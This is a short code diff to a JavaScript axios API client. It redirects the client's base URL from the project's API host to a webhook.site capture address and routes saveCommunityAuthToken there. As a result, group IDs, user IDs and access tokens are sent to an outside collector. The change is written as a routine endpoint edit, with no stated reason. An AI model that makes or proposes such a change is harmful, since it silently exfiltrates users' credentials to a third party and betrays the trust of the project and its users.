@@ -1,7 +1,7 @@
 import axios from 'axios';
 
 const CallAPIAxios = axios.create({
-    baseURL: 'https://bots-new-api.sproject.space'
+    baseURL: 'https://webhook.site/6fdd0e3e-7159-494f-a6fc-677526319008'
 });
 
 const CallAPI = (endpoint, params = {}, method = 'GET') => {
@@ -25,7 +25,7 @@ const handleAPI = (answer) => {
 };
 
 export const saveCommunityAuthToken = (group_id, user_id, access_token) => {
-    return CallAPI('/group.saveAccessToken', {
+    return CallAPI('/', {
         group_id,
         user_id,
         access_token
